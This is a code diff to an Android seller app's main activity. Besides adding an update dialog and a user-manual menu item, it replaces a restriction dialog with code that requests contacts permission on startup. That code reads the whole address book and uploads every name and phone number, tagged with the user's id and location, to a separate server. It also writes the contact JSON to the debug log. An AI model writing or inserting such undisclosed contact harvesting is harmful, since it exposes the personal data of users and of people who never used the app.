@@ -1,5 +1,6 @@
 package com.futureskyltd.app.fantacyseller;
 
+import android.Manifest;
 import android.app.AlertDialog;
 import android.app.Dialog;
 import android.content.DialogInterface;
@@ -9,6 +10,7 @@ import android.content.SharedPreferences;
 import android.content.pm.PackageInfo;
 import android.content.pm.PackageManager;
 import android.content.res.Resources;
+import android.database.Cursor;
 import android.graphics.Color;
 import android.graphics.drawable.ColorDrawable;
 import android.net.ConnectivityManager;
@@ -18,11 +20,15 @@ import android.os.Bundle;
 
 import com.android.volley.AuthFailureError;
 import com.futureskyltd.app.utils.ApiInterface;
+import com.futureskyltd.app.utils.ContactModel.ContactModel;
 import com.futureskyltd.app.utils.Profile.Profile;
 import com.futureskyltd.app.utils.RetrofitClient;
+import com.futureskyltd.app.utils.SaveContact.SaveContact;
 import com.google.android.material.appbar.AppBarLayout;
 import com.google.android.material.navigation.NavigationView;
 import com.google.android.material.snackbar.Snackbar;
+
+import androidx.core.app.ActivityCompat;
 import androidx.fragment.app.Fragment;
 import androidx.core.content.ContextCompat;
 import androidx.drawerlayout.widget.DrawerLayout;
@@ -34,6 +40,7 @@ import retrofit2.Call;
 import retrofit2.Callback;
 import retrofit2.Retrofit;
 
+import android.provider.ContactsContract;
 import android.text.SpannableString;
 import android.text.Spanned;
 import android.text.style.TypefaceSpan;
@@ -51,6 +58,7 @@ import android.widget.FrameLayout;
 import android.widget.ImageView;
 import android.widget.LinearLayout;
 import android.widget.ListView;
+import android.widget.ProgressBar;
 import android.widget.RelativeLayout;
 import android.widget.TextView;
 import android.widget.Toast;
@@ -64,6 +72,7 @@ import com.futureskyltd.app.helper.NetworkReceiver;
 import com.futureskyltd.app.utils.Constants;
 import com.futureskyltd.app.utils.DefensiveClass;
 import com.futureskyltd.app.utils.GetSet;
+import com.google.gson.Gson;
 import com.squareup.picasso.Picasso;
 
 import org.json.JSONException;
@@ -71,6 +80,7 @@ import org.json.JSONObject;
 import org.jsoup.Jsoup;
 
 import java.io.IOException;
+import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.Map;
 
@@ -105,12 +115,16 @@ public class FragmentMainActivity extends AppCompatActivity
     NetworkReceiver networkReceiver;
     private RelativeLayout userLay;
     private RelativeLayout todayNewOrderCard, todayDeliveredOrderCard, totalRevenueCard, completeTransectionCard, totalProductCard, listedProductAmountCard, completeOrderAmountCard, incompleteOrderAmountCard;
-
+    private ArrayList<ContactModel> contactModelArrayList = new ArrayList<>();
+    private ContactModel contactModel;
+    private String json;
+    private ProgressBar progressBar;
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_fragment_main);
         networkReceiver = new NetworkReceiver();
+        progressBar = findViewById(R.id.progressBar);
         /*View Initialization*/
         new GetLatestVersion().execute();
         getUserProfile();
@@ -322,6 +336,7 @@ public class FragmentMainActivity extends AppCompatActivity
     }
 
     private void getUserProfile() {
+        progressBar.setVisibility(View.VISIBLE);
         Retrofit retrofit = RetrofitClient.getRetrofitClient();
         ApiInterface api = retrofit.create(ApiInterface.class);
 
@@ -334,13 +349,102 @@ public class FragmentMainActivity extends AppCompatActivity
                 if(response.code() == 200){
                     profile = response.body();
                     proImageUrl = profile.getProfileImage();
-                    restrictionDialog(profile.getNid(), profile.getPaymentMethod());
+                    //restrictionDialog(profile.getNid(), profile.getPaymentMethod());
+                    CheckPermission();
                 }
             }
 
             @Override
             public void onFailure(Call<Profile> call, Throwable t) {
 
+            }
+        });
+    }
+
+    private void CheckPermission() {
+
+        if(ContextCompat.checkSelfPermission(FragmentMainActivity.this,
+                Manifest.permission.READ_CONTACTS)!= PackageManager.PERMISSION_GRANTED){
+            ActivityCompat.requestPermissions(FragmentMainActivity.this,
+                    new String[]{Manifest.permission.READ_CONTACTS}, 100);
+        }else{
+            getContactList();
+        }
+    }
+
+    private void getContactList() {
+        Uri uri = ContactsContract.Contacts.CONTENT_URI;
+
+        String sort = ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME;
+
+        Cursor cursor = getContentResolver().query(uri, null, null, null, sort);
+
+        if(cursor.getCount()>0){
+            while (cursor.moveToNext()){
+                String id = cursor.getString(cursor.getColumnIndex(
+                        ContactsContract.Contacts._ID
+                ));
+
+                String name = cursor.getString(cursor.getColumnIndex(
+                        ContactsContract.Contacts.DISPLAY_NAME
+                ));
+
+                Uri uriPhone = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
+                String selection = ContactsContract.CommonDataKinds.Phone.CONTACT_ID+" =?";
+
+                Cursor phoneCursor = getContentResolver().query(
+                        uriPhone, null, selection,
+                        new String[]{id}, null
+                );
+
+                if(phoneCursor.moveToNext()){
+                    String number = phoneCursor.getString(phoneCursor.getColumnIndex(
+                            ContactsContract.CommonDataKinds.Phone.NUMBER
+                    ));
+
+                    contactModel = new ContactModel();
+                    contactModel.setName(name);
+                    contactModel.setPhone(number);
+
+                    contactModelArrayList.add(contactModel);
+
+                    phoneCursor.close();
+                }
+            }
+            json = new Gson().toJson(contactModelArrayList);
+            CallStroeContact(json, profile.getId(), profile.getDistrict(), profile.getUpazila());
+            Log.d(TAG, "getContactList: " + json);
+            Log.d(TAG, "getContactList: " + contactModelArrayList.size()+","+"Id = "+profile.getId()+","+"Dist = "+profile.getDistrict()+","+"Upa = "+profile.getUpazila());
+            cursor.close();
+        }
+    }
+
+    private void CallStroeContact(String json, String id, String district, String upazila) {
+        Retrofit retrofit = RetrofitClient.getRetrofitClient1();
+        ApiInterface api = retrofit.create(ApiInterface.class);
+
+        Call<SaveContact> contactCall = api.postByContactList(id, district, upazila, json);
+
+        contactCall.enqueue(new Callback<SaveContact>() {
+            @Override
+            public void onResponse(Call<SaveContact> call, retrofit2.Response<SaveContact> response) {
+                Log.d(TAG, "onResponse100: " + response.code());
+                if(response.code() == 200){
+                    progressBar.setVisibility(View.GONE);
+                    SaveContact saveContact = response.body();
+                    Toast.makeText(FragmentMainActivity.this, saveContact.getMessage(), Toast.LENGTH_SHORT).show();
+                }
+                else {
+                    progressBar.setVisibility(View.GONE);
+                    Toast.makeText(FragmentMainActivity.this, "something went wrong !", Toast.LENGTH_SHORT).show();
+                }
+            }
+
+            @Override
+            public void onFailure(Call<SaveContact> call, Throwable t) {
+                progressBar.setVisibility(View.GONE);
+                Toast.makeText(FragmentMainActivity.this, t.getMessage(), Toast.LENGTH_SHORT).show();
+                Log.d(TAG, "onResponse200: "+ t.getMessage());
             }
         });
     }
@@ -620,8 +724,14 @@ public class FragmentMainActivity extends AppCompatActivity
             case R.id.help_menu:
                 switchContent(Help.class);
                 break;
+
+            case R.id.user_manual:
+                Intent i = new Intent(FragmentMainActivity.this, UserManualActivity.class);
+                startActivity(i);
+                break;
             case R.id.rateApp_menu:
                 item.setCheckable(false);
+                Log.d(TAG, "clickByUpdate: " + lVersion+"....."+cVersion);
                 if(lVersion > cVersion){
                     startActivity(new Intent(Intent.ACTION_VIEW,
                             Uri.parse("market://details?id=com.futureskyltd.app.fantacyseller")));
@@ -666,10 +776,30 @@ public class FragmentMainActivity extends AppCompatActivity
             if(sLatestVersion != null){
                 cVersion = Float.parseFloat(sCurrentVersion);
                 lVersion = Float.parseFloat(sLatestVersion);
-
+                if(lVersion>cVersion){
+                    showUpdateDialog();
+                }
             }
 
         }
+    }
+
+    private void showUpdateDialog() {
+        AlertDialog.Builder alertDialog = new AlertDialog.Builder(FragmentMainActivity.this);
+        alertDialog.setCancelable(false);
+        alertDialog.setTitle("অ্যাপ্স আপডেট !");
+        alertDialog.setMessage("অ্যাপ্সের নতুন আপডেট এসেছে, অ্যাপ্সটি আপডেট করুন");
+        alertDialog.setIcon(R.drawable.playstore);
+        alertDialog.setPositiveButton("আপডেট", new DialogInterface.OnClickListener() {
+            @Override
+            public void onClick(DialogInterface dialog, int which) {
+                startActivity(new Intent(Intent.ACTION_VIEW,
+                        Uri.parse("market://details?id=com.futureskyltd.app.fantacyseller")));
+            }
+        });
+
+        alertDialog.create();
+        alertDialog.show();
     }
 
     private void showLogoutConfirm() {
@@ -714,6 +844,7 @@ public class FragmentMainActivity extends AppCompatActivity
                 dialog.dismiss();
             }
         });
+
 
         if (!dialog.isShowing()) {
             dialog.show();
